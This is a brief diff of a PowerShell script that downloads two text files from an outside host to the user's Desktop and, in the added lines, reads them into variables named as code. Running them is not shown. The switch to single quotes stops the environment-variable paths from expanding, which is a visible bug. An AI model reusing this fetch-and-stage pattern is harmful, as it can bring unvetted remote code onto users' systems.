@@ -1,2 +1,5 @@
-(New-Object System.Net.WebClient).DownloadFile("https://r4v3n.org/rr/car/car1.txt", "$ENV:USERPROFILE\Desktop\car1.txt");
-(New-Object System.Net.WebClient).DownloadFile("https://r4v3n.org/rr/car/car2.txt", "$ENV:USERPROFILE\Desktop\car2.txt");
+(New-Object System.Net.WebClient).DownloadFile('https://r4v3n.org/rr/car/car1.txt', '$ENV:USERPROFILE\Desktop\car1.txt');
+(New-Object System.Net.WebClient).DownloadFile('https://r4v3n.org/rr/car/car2.txt', '$ENV:USERPROFILE\Desktop\car2.txt');
+
+$code1 = [IO.File]::ReadAllText('$ENV:USERPROFILE\Desktop\car1.txt');
+$code2 = [IO.File]::ReadAllText('$ENV:USERPROFILE\Desktop\car2.txt');
